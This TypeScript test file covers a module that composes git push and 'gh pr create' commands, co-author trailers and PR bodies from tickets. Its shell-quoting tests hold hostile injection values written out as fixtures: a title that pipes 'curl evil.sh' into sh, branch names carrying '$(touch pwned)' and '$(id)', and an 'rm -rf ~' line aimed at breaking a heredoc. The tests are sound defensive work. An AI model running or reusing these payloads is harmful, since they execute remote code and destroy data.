import { expect, test, describe } from "bun:test";
import { createStore } from "@standup/store";
import {
  upsertProject,
  createSession,
  createTicket,
  setTicketSession,
  createLaunch,
  setTicketLaunch,
  getTicket,
  upsertActor,
  recordParticipant,
  mergeActors,
  createReviewFinding,
  supersedeOpenFindings,
  setFindingStatus,
} from "@standup/store";
import type { Launch, Project, ReviewFinding, Ticket } from "@standup/shared";
import {
  composeTicketPublish,
  publishTicket,
  type PublishContext,
} from "./publisher.js";
import { shquote } from "./shell.js";
import { setActiveOrgProfile } from "./org-profile/load.js";
import { exampleCorpProfile } from "./org-profile/fixtures/example-corp.js";

/** Runs `fn` with the example.corp org profile (email domain example.corp) active. */
function withOrgProfile(fn: () => void): void {
  setActiveOrgProfile(exampleCorpProfile());
  try {
    fn();
  } finally {
    setActiveOrgProfile();
  }
}

function project(overrides: Partial<Project> = {}): Project {
  return { id: "p", name: "p", branch: "main", repos: ["~/code/p"], ...overrides };
}

function ticket(overrides: Partial<Ticket> = {}): Ticket {
  const now = new Date();
  return {
    id: "T1",
    projectId: "p",
    lens: "bugs",
    title: "Fix the widget",
    body: "The widget double-counted on retry.",
    severity: "high",
    status: "shipped",
    createdAt: now,
    updatedAt: now,
    ...overrides,
  };
}

function launch(overrides: Partial<Launch> = {}): Launch {
  return {
    id: "L1",
    kind: "worktree",
    projectId: "p",
    task: "Fix the widget",
    worktreePath: "/tmp/wt",
    branch: "standup/fix-the-widget-abc123",
    baseBranch: "main",
    status: "running",
    keepAlive: false,
    createdAt: new Date(),
    ...overrides,
  };
}

function ctx(overrides: Partial<PublishContext> = {}): PublishContext {
  return {
    ticket: ticket(),
    project: project(),
    launch: launch(),
    participants: [],
    findings: [],
    ...overrides,
  };
}

function finding(overrides: Partial<ReviewFinding> = {}): ReviewFinding {
  const now = new Date();
  return {
    id: "F1",
    ticketId: "T1",
    severity: "high",
    title: "Unbounded loop",
    body: "",
    status: "open",
    evidence: { checks: [], screenshots: [] },
    createdAt: now,
    updatedAt: now,
    ...overrides,
  };
}

describe("composeTicketPublish (dry-run, pure)", () => {
  test("resolves the head branch, base branch, and a draft:true PR payload", () => {
    const res = composeTicketPublish(ctx());
    expect(res.branch).toBe("standup/fix-the-widget-abc123");
    expect(res.baseBranch).toBe("main");
    expect(res.pr).toEqual({
      draft: true,
      title: "Fix the widget",
      body: expect.stringContaining("The widget double-counted on retry."),
      base: "main",
      head: "standup/fix-the-widget-abc123",
    });
    expect(res.live).toBe(false);
    expect(res.warnings).toEqual([]);
  });

  test("base falls back to the project branch when the launch carries none", () => {
    const res = composeTicketPublish(
      ctx({ launch: launch({ baseBranch: undefined }), project: project({ branch: "trunk" }) })
    );
    expect(res.baseBranch).toBe("trunk");
    expect(res.pr.base).toBe("trunk");
  });

  test("commit message is subject + body + Co-authored-by trailers", () => {
    const res = composeTicketPublish(
      ctx({ participants: [{ actorId: "alice", display: "Alice A", githubLogin: "alice-gh" }] })
    );
    expect(res.commitMessage).toBe(
      "Fix the widget\n\n" +
        "The widget double-counted on retry.\n\n" +
        "Co-authored-by: Alice A <alice-gh@users.noreply.github.com>"
    );
  });

  test("PR body links the ticket and lists its review findings, but carries no trailers", () => {
    const now = new Date();
    const res = composeTicketPublish(
      ctx({
        ticket: ticket({ issueId: "ISSUE-9", taskUrl: "https://task/ISSUE-9" }),
        participants: [{ actorId: "alice", githubLogin: "alice-gh" }],
        findings: [
          {
            id: "F1", ticketId: "T1", severity: "high", title: "Unbounded loop",
            body: "", file: "src/w.ts", line: 42, status: "open",
            evidence: { checks: [], screenshots: [] }, createdAt: now, updatedAt: now,
          },
        ],
      })
    );
    expect(res.pr.body).toContain("Ticket `T1`");
    expect(res.pr.body).toContain("[ISSUE-9](https://task/ISSUE-9)");
    expect(res.pr.body).toContain("## Review findings");
    expect(res.pr.body).toContain("Unbounded loop");
    expect(res.pr.body).toContain("src/w.ts:42");
    // Git credits co-authorship from the commit, so the trailer stays off the body.
    expect(res.pr.body).not.toContain("Co-authored-by");
  });

  test("dedups Co-authored-by trailers across duplicate participants", () => {
    const res = composeTicketPublish(
      ctx({
        participants: [
          { actorId: "alice", display: "Alice", githubLogin: "alice-gh" },
          { actorId: "alice", display: "Alice", githubLogin: "alice-gh" },
          { actorId: "bob", display: "Bob", githubLogin: "bob-gh" },
        ],
      })
    );
    expect(res.coAuthors).toEqual([
      "Co-authored-by: Alice <alice-gh@users.noreply.github.com>",
      "Co-authored-by: Bob <bob-gh@users.noreply.github.com>",
    ]);
  });

  test("composes push + `gh pr create --draft`, body via --body-file (no shell-escaped body)", () => {
    const res = composeTicketPublish(
      ctx({ ticket: ticket({ body: "## Summary\n\nline two" }) })
    );
    // No participants → no trailer amend; the push leads, gh closes.
    expect(res.commands[0]).toBe(
      "git -C '/tmp/wt' push -u origin 'standup/fix-the-widget-abc123'"
    );
    const gh = res.commands[res.commands.length - 1];
    expect(gh).toContain("gh pr create --draft");
    expect(gh).toContain("--base 'main'");
    expect(gh).toContain("--head 'standup/fix-the-widget-abc123'");
    expect(gh).toContain("--body-file '/tmp/wt/.standup-pr-body.md'");
    // A multi-line body must never leak a shell-escaped --body with literal \n.
    expect(gh).not.toContain("--body ");
    expect(gh).not.toContain("\\n");
  });

  test("returns a descriptionFile pairing pr.body with the --body-file path and writes it", () => {
    const res = composeTicketPublish(
      ctx({ ticket: ticket({ body: "## Summary\n\nline two" }) })
    );
    // The file the gh command reads is surfaced with its exact path + contents.
    expect(res.descriptionFile.path).toBe("/tmp/wt/.standup-pr-body.md");
    expect(res.descriptionFile.contents).toBe(res.pr.body);
    const gh = res.commands[res.commands.length - 1];
    expect(gh).toContain("--body-file '/tmp/wt/.standup-pr-body.md'");
    // The sequence writes that file, so it is runnable verbatim (gh won't abort on
    // a missing --body-file). A quoted heredoc keeps a hostile/multi-line body inert.
    const write = res.commands.find((cmd) =>
      cmd.startsWith("cat > '/tmp/wt/.standup-pr-body.md'")
    );
    expect(write).toBeDefined();
    expect(write).toContain("<<'STANDUP_PR_BODY'");
    expect(write).toContain(res.pr.body);
    // The write must precede the gh command that reads the file.
    const writeIdx = res.commands.findIndex((cmd) => cmd === write);
    const ghIdx = res.commands.findIndex((cmd) => cmd.startsWith("gh pr create"));
    expect(writeIdx).toBeLessThan(ghIdx);
  });

  test("bakes the deduped Co-authored-by trailers onto the commit before pushing", () => {
    const res = composeTicketPublish(
      ctx({
        participants: [
          { actorId: "alice", display: "Alice", githubLogin: "alice-gh" },
          { actorId: "alice", display: "Alice", githubLogin: "alice-gh" },
          { actorId: "bob", display: "Bob", githubLogin: "bob-gh" },
        ],
      })
    );
    const amendIdx = res.commands.findIndex((c) => c.includes("commit --amend"));
    const pushIdx = res.commands.findIndex((c) => c.includes("push -u origin"));
    expect(amendIdx).toBeGreaterThanOrEqual(0);
    // The amend must precede the push so the trailer'd commit is what gets pushed.
    expect(amendIdx).toBeLessThan(pushIdx);
    const amend = res.commands[amendIdx];
    // Runs in the worktree and preserves the agent's authored message.
    expect(amend).toContain("git -C '/tmp/wt' commit --amend --no-edit");
    // One --trailer per deduped co-author, single-quoted so the `<email>` is inert.
    expect(amend).toContain(
      "--trailer 'Co-authored-by: Alice <alice-gh@users.noreply.github.com>'"
    );
    expect(amend).toContain(
      "--trailer 'Co-authored-by: Bob <bob-gh@users.noreply.github.com>'"
    );
    // Deduped: Alice recorded twice still yields a single trailer.
    expect(amend.match(/Co-authored-by: Alice/g)).toHaveLength(1);
    // The exact trailers baked on the commit match the surfaced coAuthors.
    for (const trailer of res.coAuthors) expect(amend).toContain(shquote(trailer));
  });

  test("no co-authors → no commit-amend step (nothing to credit), but still pushes + opens PR", () => {
    const res = composeTicketPublish(ctx({ participants: [] }));
    expect(res.commands.some((c) => c.includes("commit --amend"))).toBe(false);
    expect(res.commands.some((c) => c.includes("push -u origin"))).toBe(true);
    expect(res.commands.some((c) => c.startsWith("gh pr create"))).toBe(true);
  });

  test("single-quotes the --title so a hostile title can't run shell code", () => {
    // An agent/Slack/reviewer-authored title carrying `$(...)`, backticks, or
    // `$VAR` must be inert when a human pastes the composed command. Single
    // quotes suppress every expansion; a JSON.stringify double-quote form would
    // not (a shell still runs `$(...)` inside "...").
    const res = composeTicketPublish(
      ctx({ ticket: ticket({ title: "$(curl evil.sh|sh) `id` $HOME" }) })
    );
    const gh = res.commands[res.commands.length - 1];
    expect(gh).toContain("--title '$(curl evil.sh|sh) `id` $HOME'");
    // Never the double-quoted form, which leaves substitution/expansion live.
    expect(gh).not.toContain('--title "');
  });

  test("escapes an embedded single quote in the title without breaking the quoting", () => {
    const res = composeTicketPublish(ctx({ ticket: ticket({ title: "can't stop" }) }));
    const gh = res.commands[res.commands.length - 1];
    expect(gh).toContain("--title 'can'\\''t stop'");
  });

  test("PR body lists only active findings — superseded/dismissed are excluded, no dup", () => {
    const res = composeTicketPublish(
      ctx({
        findings: [
          // A re-review superseded the original F1 and recorded a fresh F2 for the
          // same issue; a human dismissed F3. Only the open F2 is a live concern.
          finding({ id: "F1", title: "Unbounded loop", status: "superseded" }),
          finding({ id: "F2", title: "Unbounded loop", status: "open" }),
          finding({ id: "F3", severity: "medium", title: "Waved-off nit", status: "dismissed" }),
          finding({ id: "F4", severity: "low", title: "Fixer in flight", status: "dispatched" }),
        ],
      })
    );
    expect(res.pr.body).toContain("## Review findings");
    // The open finding and the dispatched (fix-in-flight) one surface...
    expect(res.pr.body).toContain("Fixer in flight");
    // ...and "Unbounded loop" appears exactly once (F2), not duplicated by F1.
    expect(res.pr.body.match(/Unbounded loop/g)).toHaveLength(1);
    // Resolved/waved-off findings never render as live defects.
    expect(res.pr.body).not.toContain("Waved-off nit");
  });

  test("PR body omits the findings section when every finding is superseded/dismissed", () => {
    const res = composeTicketPublish(
      ctx({
        findings: [
          finding({ id: "F1", title: "Old", status: "superseded" }),
          finding({ id: "F2", title: "Nit", status: "dismissed" }),
        ],
      })
    );
    expect(res.pr.body).not.toContain("## Review findings");
  });

  test("no resolvable branch (in-place/scratch marker) → no head, a warning, and no push", () => {
    const res = composeTicketPublish(
      ctx({ launch: launch({ branch: "(in-place — existing workspace)" }) })
    );
    expect(res.branch).toBeUndefined();
    expect(res.pr.head).toBeUndefined();
    expect(res.warnings).toHaveLength(1);
    expect(res.warnings[0]).toContain("head is unknown");
    // Nothing to push or amend without a branch — only the body-file write and
    // the gh command are composed, and neither touches git.
    expect(res.commands.some((cmd) => cmd.includes("push -u origin"))).toBe(false);
    expect(res.commands.some((cmd) => cmd.includes("commit --amend"))).toBe(false);
    expect(res.commands[res.commands.length - 1]).toContain("gh pr create --draft");
  });

  test("a missing launch leaves the head unknown and bases on the project branch", () => {
    const res = composeTicketPublish(ctx({ launch: null, project: project({ branch: "main" }) }));
    expect(res.branch).toBeUndefined();
    expect(res.baseBranch).toBe("main");
    expect(res.warnings).toHaveLength(1);
  });

  test("a worktree path with a space is shell-quoted across git -C, cat >, and --body-file", () => {
    // The worktree root is user/UI/env-configurable — a real macOS repo can sit
    // under `/Users/foo/My Code/widget`. Unquoted, `git -C …/My Code/…` splits its
    // argument, `cat > …/My Code/…` is an ambiguous redirect, and `--body-file`
    // loses the file, so none of the "runnable verbatim" commands actually run.
    const res = composeTicketPublish(
      ctx({
        launch: launch({ worktreePath: "/Users/foo/My Code/widget" }),
        participants: [{ actorId: "alice", display: "Alice", githubLogin: "alice-gh" }],
      })
    );
    // The returned filesystem path stays raw (no shell quoting) — it's the actual path.
    expect(res.descriptionFile.path).toBe("/Users/foo/My Code/widget/.standup-pr-body.md");
    // git -C carries the worktree as one single-quoted word (amend + push).
    const amend = res.commands.find((c) => c.includes("commit --amend"))!;
    expect(amend).toContain("git -C '/Users/foo/My Code/widget' commit --amend");
    const push = res.commands.find((c) => c.includes("push -u origin"))!;
    expect(push).toContain("git -C '/Users/foo/My Code/widget' push -u origin");
    // The heredoc write and gh --body-file both quote the file path.
    const write = res.commands.find((c) => c.startsWith("cat >"))!;
    expect(write).toContain("cat > '/Users/foo/My Code/widget/.standup-pr-body.md'");
    const gh = res.commands[res.commands.length - 1];
    expect(gh).toContain("--body-file '/Users/foo/My Code/widget/.standup-pr-body.md'");
    // The space never leaks as a bare word-split anywhere in the sequence.
    expect(res.commands.some((c) => c.includes(" /Users/foo/My Code"))).toBe(false);
  });

  test("shell-quotes the base and head branch so a hostile branch name can't inject", () => {
    // A branch/base name is launcher/UI/env-derived, so it must be treated as
    // untrusted: a value carrying `$(...)`, a space, or `;` has to be inert when a
    // human pastes the push + `gh pr create` block. Only the title was quoted
    // before — the branch and base rode in bare, so a crafted branch could run
    // code (`git push -u origin feature;$(touch pwned)`).
    const evilBranch = "feature;$(touch pwned) branch";
    const evilBase = "main;$(id)";
    const res = composeTicketPublish(
      ctx({ launch: launch({ branch: evilBranch, baseBranch: evilBase }) })
    );
    const push = res.commands.find((c) => c.includes("push -u origin"))!;
    // The branch rides as one single-quoted word in the push and as --head.
    expect(push).toContain(`push -u origin ${shquote(evilBranch)}`);
    const gh = res.commands[res.commands.length - 1];
    expect(gh).toContain(`--head ${shquote(evilBranch)}`);
    expect(gh).toContain(`--base ${shquote(evilBase)}`);
    // The metacharacters never leak as a bare, splittable/expandable word.
    expect(push).not.toContain("push -u origin feature;");
    expect(gh).not.toContain("--head feature;");
    expect(gh).not.toContain("--base main;");
  });

  test("a body containing the heredoc delimiter line cannot terminate the heredoc early", () => {
    // The PR-body write uses a `<<'DELIM'` heredoc. With a fixed DELIM, a body
    // whose own text carries a line equal to DELIM would close the heredoc early
    // and hand the shell the remainder as commands. Here the body embeds the base
    // delimiter followed by a hostile line; the composed write must pick a
    // delimiter absent from the body so the whole body stays enclosed and inert.
    const res = composeTicketPublish(
      ctx({ ticket: ticket({ body: `intro\nSTANDUP_PR_BODY\nrm -rf ~ # would run if heredoc broke` }) })
    );
    const write = res.commands.find((c) => c.startsWith("cat >"))!;
    const delim = write.match(/<<'([^']+)'\n/)![1];
    // A collision forces a fresh delimiter — never the base the body contains.
    expect(delim).not.toBe("STANDUP_PR_BODY");
    // The chosen delimiter appears on no body line, so it can't close early.
    expect(res.pr.body.split("\n")).not.toContain(delim);
    // The full body is enclosed verbatim between the opening and closing delimiter,
    // so the hostile `rm -rf` line is heredoc content, never an executed command.
    expect(write).toBe(
      `cat > ${shquote(res.descriptionFile.path)} <<'${delim}'\n${res.pr.body}\n${delim}`
    );
    expect(write).toContain("rm -rf ~ # would run if heredoc broke");
  });

  test("an unreconciled slack: participant is warned, not silently dropped from co-authors", () => {
    // A scheme-prefixed actor id (`slack:U…`) that was never reconciled to a
    // user alias has no derivable email, so it earns no `Co-authored-by` trailer
    // — but it IS a real collaborator, so it must surface as a visible warning
    // rather than vanish. (Guessing `slack:U…@<domain>` would be a fake credit.)
    const res = composeTicketPublish(
      ctx({ participants: [{ actorId: "slack:U123", display: "Sally Slack" }] })
    );
    expect(res.coAuthors).toEqual([]);
    const warned = res.warnings.some(
      (w) => w.includes("Co-authored-by") && w.includes("Sally Slack")
    );
    expect(warned).toBe(true);
  });

  test("a bare-alias participant is credited through the org profile's email domain and raises no under-credit warning", () => {
    // The warning is scoped to genuinely uncreditable collaborators — an alias
    // the org profile resolves is credited via the fallback and must not trip a
    // spurious warning.
    withOrgProfile(() => {
      const res = composeTicketPublish(ctx({ participants: [{ actorId: "ana", display: "Ana" }] }));
      expect(res.coAuthors).toEqual(["Co-authored-by: Ana <ana@example.corp>"]);
      expect(res.warnings.some((w) => w.includes("Co-authored-by"))).toBe(false);
    });
  });

  test("without an email domain a bare alias can't be credited, and is warned about", () => {
    const res = composeTicketPublish(ctx({ participants: [{ actorId: "ana", display: "Ana" }] }));
    expect(res.coAuthors).toEqual([]);
    expect(res.warnings.some((w) => w.includes("Co-authored-by") && w.includes("Ana"))).toBe(true);
  });

  test("live publish is refused in this build (throws before any git/gh)", () => {
    expect(() => composeTicketPublish(ctx(), { live: true })).toThrow(
      /live publish is not enabled/i
    );
  });
});

describe("publishTicket (store-backed, dry-run)", () => {
  test("dedups trailers across duplicate + merged participants and lists findings; no network", () => withOrgProfile(() => {
    const store = createStore(":memory:");
    upsertProject(store.db, { id: "p", name: "p", branch: "main", repos: ["~/code/p"] });
    createSession(store.db, {
      id: "S1", projectId: "p", title: "", cwd: "/tmp/S1", status: "running",
    });

    // Two distinct humans plus a Slack row folded into one of them: alice recorded
    // twice (duplicate), and slack:U1 merged into alice (a merged duplicate).
    upsertActor(store.db, "alice", { display: "Alice", githubLogin: "alice-gh" });
    recordParticipant(store.db, "S1", "alice");
    recordParticipant(store.db, "S1", "alice");
    upsertActor(store.db, "ana", { display: "Ana" });
    recordParticipant(store.db, "S1", "ana");
    recordParticipant(store.db, "S1", "slack:U1");
    mergeActors(store.db, "slack:U1", "alice");

    const t = createTicket(store.db, {
      projectId: "p", lens: "bugs", title: "Fix the widget",
      body: "The widget double-counted on retry.", severity: "high",
    });
    setTicketSession(store.db, t.id, "S1");
    const l = createLaunch(store.db, {
      id: "L1", projectId: "p", task: "Fix the widget",
      worktreePath: "/tmp/wt", branch: "standup/fix-abc", baseBranch: "main",
    });
    setTicketLaunch(store.db, t.id, l.id);
    createReviewFinding(store.db, {
      ticketId: t.id, severity: "high", title: "Unbounded loop", file: "src/w.ts", line: 42,
    });

    const fresh = getTicket(store.db, t.id)!;
    const res = publishTicket(store.db, { ticket: fresh, project: project(), launch: l });

    expect(res.branch).toBe("standup/fix-abc");
    expect(res.baseBranch).toBe("main");
    // alice (twice) + slack:U1→alice all collapse to one trailer; ana is credited
    // via the org profile's email domain (bare alias, no login/email).
    expect(res.coAuthors).toEqual([
      "Co-authored-by: Alice <alice-gh@users.noreply.github.com>",
      "Co-authored-by: Ana <ana@example.corp>",
    ]);
    expect(res.commitMessage).toContain("Co-authored-by: Alice <alice-gh@users.noreply.github.com>");
    expect(res.pr.body).toContain("Unbounded loop");
    expect(res.pr.draft).toBe(true);
    expect(res.live).toBe(false);
    // The body file is surfaced and its write precedes gh; the deduped trailers
    // are baked onto the commit by the amend step so co-authorship actually lands.
    expect(res.descriptionFile.contents).toBe(res.pr.body);
    const amend = res.commands.find((cmd) => cmd.includes("commit --amend"))!;
    expect(amend).toContain("--trailer 'Co-authored-by: Alice <alice-gh@users.noreply.github.com>'");
    expect(amend).toContain("--trailer 'Co-authored-by: Ana <ana@example.corp>'");
    store.close();
  }));

  test("re-reviewed/dismissed findings drop from the body; only the fresh open one lists", () => {
    const store = createStore(":memory:");
    upsertProject(store.db, { id: "p", name: "p", branch: "main", repos: ["~/code/p"] });
    const t = createTicket(store.db, {
      projectId: "p", lens: "bugs", title: "Fix the widget", body: "", severity: "high",
    });
    const l = createLaunch(store.db, {
      id: "L1", projectId: "p", task: "Fix the widget", worktreePath: "/tmp/wt", branch: "standup/fix-abc",
    });
    setTicketLaunch(store.db, t.id, l.id);

    // Original review recorded F1; a human dismissed a separate F3.
    createReviewFinding(store.db, { ticketId: t.id, severity: "high", title: "Unbounded loop" });
    const f3 = createReviewFinding(store.db, { ticketId: t.id, severity: "medium", title: "Waved-off nit" });
    setFindingStatus(store.db, f3.id, "dismissed");
    // Re-review supersedes the still-open F1 and records a fresh F2 for the issue.
    supersedeOpenFindings(store.db, t.id);
    createReviewFinding(store.db, { ticketId: t.id, severity: "high", title: "Unbounded loop" });

    const res = publishTicket(store.db, { ticket: getTicket(store.db, t.id)!, project: project(), launch: l });
    // "Unbounded loop" shows once (the fresh open F2), not duplicated by superseded F1.
    expect(res.pr.body.match(/Unbounded loop/g)).toHaveLength(1);
    expect(res.pr.body).not.toContain("Waved-off nit");
    store.close();
  });

  test("a ticket with no session credits no co-authors (no participants)", () => {
    const store = createStore(":memory:");
    upsertProject(store.db, { id: "p", name: "p", branch: "main", repos: ["~/code/p"] });
    const t = createTicket(store.db, {
      projectId: "p", lens: "bugs", title: "Solo fix", body: "", severity: "low",
    });
    const l = createLaunch(store.db, {
      id: "L1", projectId: "p", task: "Solo fix", worktreePath: "/tmp/wt2", branch: "standup/solo",
    });
    setTicketLaunch(store.db, t.id, l.id);

    const res = publishTicket(store.db, { ticket: getTicket(store.db, t.id)!, project: project(), launch: l });
    expect(res.coAuthors).toEqual([]);
    expect(res.commitMessage).toBe("Solo fix");
    store.close();
  });
});
